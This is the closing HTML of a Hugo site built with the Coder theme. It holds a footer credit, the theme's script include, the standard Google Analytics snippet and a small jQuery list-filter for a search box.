+Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>
